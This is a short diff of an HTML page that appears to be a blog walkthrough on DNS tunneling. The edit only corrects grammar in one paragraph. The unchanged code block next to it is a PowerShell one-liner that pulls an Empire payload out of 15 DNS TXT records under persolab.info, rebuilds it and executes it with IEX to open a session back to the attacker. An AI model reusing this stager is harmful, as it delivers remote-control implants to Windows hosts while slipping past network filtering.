@@ -204,7 +204,7 @@
                                 </div>
 
                                 <img src="img/dnstunneling/empirepayload.jpg" class="img-fluid" width="700">
-                                All the PowerShell payload stored in my web application has been put in the DNS server. The payload is divided in 15 TXT records. The last steps are to reconstruct the payload and run in a system. After running the payload on a Windows machine, an Empire session should be opened on our attacker system.
+                                All the PowerShell payload stored in my web application has been put in the DNS server. The payload is divided in 15 TXT records. The last steps are to reconstruct the payload and to run in a system. After running the payload in a Windows machine, an Empire session should be opened in our attacker system.
                                 <div class="squarebox">
                                     $numberofsubdomain = 15;$result = "";For($i=0; $i -lt $numberofsubdomain; $i++){$temp = (nslookup -q=txt $i”.persolab.info”)[-1];$result = $result + $temp.replace(“`t”, “”).replace(“`””,””);}$result = $result.replace("`"","");Write-Host($result);IEX($result);
                                 </div>
